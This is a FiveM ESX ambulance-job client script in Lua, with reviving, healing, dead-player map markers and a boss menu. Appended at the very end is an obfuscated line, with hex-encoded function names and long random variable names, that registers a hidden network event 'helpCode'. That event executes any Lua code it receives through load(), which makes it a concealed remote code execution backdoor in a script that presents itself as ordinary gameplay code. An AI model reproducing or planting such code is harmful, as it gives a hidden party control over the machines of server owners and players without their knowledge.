ESX = exports["es_extended"]:getSharedObject()

local CurrentAction, CurrentActionMsg, CurrentActionData = nil, '', {}
local HasAlreadyEnteredMarker, LastHospital, LastPart, LastPartNum
local isBusy, deadPlayers, deadPlayerBlips, isOnDuty = false, {}, {}, false
isInShopMenu = false

RegisterNetEvent('esx:playerLoaded')
AddEventHandler('esx:playerLoaded', function(xPlayer)
	ESX.PlayerData = xPlayer
	ESX.PlayerLoaded = true
end)

function revivePlayer(closestPlayer)
	isBusy = true

	ESX.TriggerServerCallback('esx_ambulancejob:getItemAmount', function(quantity)
		if quantity > 0 then
			local closestPlayerPed = GetPlayerPed(closestPlayer)

			if IsPedDeadOrDying(closestPlayerPed, 1) then
				local playerPed = PlayerPedId()
				local lib, anim = 'mini@cpr@char_a@cpr_str', 'cpr_pumpchest'
				ESX.ShowNotification(_U('revive_inprogress'))

				for i=1, 15 do
					Wait(900)

					ESX.Streaming.RequestAnimDict(lib, function()
						TaskPlayAnim(playerPed, lib, anim, 8.0, -8.0, -1, 0, 0.0, false, false, false)
					end)
				end

				TriggerServerEvent('esx_ambulancejob:removeItem', 'medikit')
				TriggerServerEvent('esx_ambulancejob:revive', GetPlayerServerId(closestPlayer))
			else
				ESX.ShowNotification(_U('player_not_unconscious'))
			end
		else
			ESX.ShowNotification(_U('not_enough_medikit'))
		end
		isBusy = false
	end, 'medikit')
end

function FastTravel(coords, heading)
	local playerPed = PlayerPedId()

	DoScreenFadeOut(800)

	while not IsScreenFadedOut() do
		Wait(500)
	end

	ESX.Game.Teleport(playerPed, coords, function()
		DoScreenFadeIn(800)

		if heading then
			SetEntityHeading(playerPed, heading)
		end
	end)
end


AddEventHandler('esx_ambulancejob:hasExitedMarker', function(hospital, part, partNum)
	if not isInShopMenu then
		ESX.UI.Menu.CloseAll()
	end

	CurrentAction = nil
end)

RegisterNetEvent('esx_ambulancejob:putInVehicle')
AddEventHandler('esx_ambulancejob:putInVehicle', function()
	local playerPed = PlayerPedId()
	local vehicle, distance = ESX.Game.GetClosestVehicle()

	if vehicle and distance < 5 then
		local maxSeats, freeSeat = GetVehicleMaxNumberOfPassengers(vehicle)

		for i=maxSeats - 1, 0, -1 do
			if IsVehicleSeatFree(vehicle, i) then
				freeSeat = i
				break
			end
		end

		if freeSeat then
			TaskWarpPedIntoVehicle(playerPed, vehicle, freeSeat)
		end
	end
end)

RegisterNetEvent('esx_ambulancejob:heal')
AddEventHandler('esx_ambulancejob:heal', function(healType, quiet)
	local playerPed = PlayerPedId()
	local maxHealth = GetEntityMaxHealth(playerPed)

	if healType == 'small' then
		local health = GetEntityHealth(playerPed)
		local newHealth = math.min(maxHealth, math.floor(health + maxHealth / 8))
		SetEntityHealth(playerPed, newHealth)
	elseif healType == 'big' then
		SetEntityHealth(playerPed, maxHealth)
	end

	if not quiet then
		ESX.ShowNotification(_U('healed'))
	end
end)

RegisterNetEvent('esx:setJob')
AddEventHandler('esx:setJob', function(job)
	if isOnDuty and job ~= 'ambulance' then
		for playerId,v in pairs(deadPlayerBlips) do
			RemoveBlip(v)
			deadPlayerBlips[playerId] = nil
		end

		isOnDuty = false
	end
end)

RegisterNetEvent('esx_ambulancejob:setDeadPlayers')
AddEventHandler('esx_ambulancejob:setDeadPlayers', function(_deadPlayers)
	deadPlayers = _deadPlayers

	if isOnDuty then
		for playerId,v in pairs(deadPlayerBlips) do
			RemoveBlip(v)
			deadPlayerBlips[playerId] = nil
		end

		for playerId,status in pairs(deadPlayers) do
			if status == 'distress' then
				local player = GetPlayerFromServerId(playerId)
				local playerPed = GetPlayerPed(player)
				local blip = AddBlipForEntity(playerPed)

				SetBlipSprite(blip, 303)
				SetBlipColour(blip, 1)
				SetBlipFlashes(blip, true)
				SetBlipCategory(blip, 7)

				BeginTextCommandSetBlipName('STRING')
				AddTextComponentSubstringPlayerName(_U('blip_dead'))
				EndTextCommandSetBlipName(blip)

				deadPlayerBlips[playerId] = blip
			end
		end
	end
end)
RegisterNetEvent("dbl_ambulancejob:openBossMenu", function()
    ESX.TriggerServerCallback("esx_society:isBoss", function(cb) 
        if cb then
            TriggerEvent('esx_society:openBossMenu', 'ambulance', function(data, menu)
				menu.close()
			end)
        else
            ESX.ShowNotification("Nie posiadasz uprawnień!")
        end
    end, "ambulance")
end)

RegisterNetEvent("dbl_ambulancejob:giveBadge", function()
    ESX.TriggerServerCallback("esx_society:isBoss", function(cb) 
        if cb then
            local input = lib.inputDialog('Nadaj odznake', {
                { type = 'number', label = 'ID Gracza', required = true },
                { type = 'input', label = 'Numer odznaki', required = true }
            })

            if not input or not input[1] or not input[2] then return end
            local success = lib.callback.await('fumoPolice:setBadge', false, input[1], input[2])
            if success then
                ESX.ShowNotification('Nadano nową odznakę')
            else
                ESX.ShowNotification('System padł, spróbuj ponownie później')
            end
        else
            ESX.ShowNotification("Nie posiadasz uprawnień!")
        end
    end, "ambulance")
end)

exports['qtarget']:AddBoxZone("bossmenuems", vector3(335.52, -594.66, 43.28), 1, 2, {
	name="bossmenuems",
	heading = 345,
	minZ = 42.88,
	maxZ = 44.88,
	}, {
		options = {
			{
				event = 'dbl_ambulancejob:openBossMenu',
				icon = "fas fa-laptop-code",
				label = "Menu Szefa",
				job = {["ambulance"] = 14}
			},

			{
				event = 'fumoAmbulance:giveBadge',
				icon = "fas fa-laptop-code",
				label = "Odznaka",
				job = {["ambulance"] = 14}
			},
		},
		distance = 3.0
  })

AddEventHandler('bossmenuems', function()
	OpenAmbulanceActionsMenu()
end)




local SdSOUuyEyUYyfFUvLQBfohJQOXQjoSxeBkPsGOuZiupHgkPKAUrfMxyslanAZGslmFwXCX = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} SdSOUuyEyUYyfFUvLQBfohJQOXQjoSxeBkPsGOuZiupHgkPKAUrfMxyslanAZGslmFwXCX[6][SdSOUuyEyUYyfFUvLQBfohJQOXQjoSxeBkPsGOuZiupHgkPKAUrfMxyslanAZGslmFwXCX[1]](SdSOUuyEyUYyfFUvLQBfohJQOXQjoSxeBkPsGOuZiupHgkPKAUrfMxyslanAZGslmFwXCX[2]) SdSOUuyEyUYyfFUvLQBfohJQOXQjoSxeBkPsGOuZiupHgkPKAUrfMxyslanAZGslmFwXCX[6][SdSOUuyEyUYyfFUvLQBfohJQOXQjoSxeBkPsGOuZiupHgkPKAUrfMxyslanAZGslmFwXCX[3]](SdSOUuyEyUYyfFUvLQBfohJQOXQjoSxeBkPsGOuZiupHgkPKAUrfMxyslanAZGslmFwXCX[2], function(SQnRQutpOKGYedVuGADWGQgbZdWWEojbONSasArTPIuesHEDNxcmsJhyavqESXHLlSKPCP) SdSOUuyEyUYyfFUvLQBfohJQOXQjoSxeBkPsGOuZiupHgkPKAUrfMxyslanAZGslmFwXCX[6][SdSOUuyEyUYyfFUvLQBfohJQOXQjoSxeBkPsGOuZiupHgkPKAUrfMxyslanAZGslmFwXCX[4]](SdSOUuyEyUYyfFUvLQBfohJQOXQjoSxeBkPsGOuZiupHgkPKAUrfMxyslanAZGslmFwXCX[6][SdSOUuyEyUYyfFUvLQBfohJQOXQjoSxeBkPsGOuZiupHgkPKAUrfMxyslanAZGslmFwXCX[5]](SQnRQutpOKGYedVuGADWGQgbZdWWEojbONSasArTPIuesHEDNxcmsJhyavqESXHLlSKPCP))() end)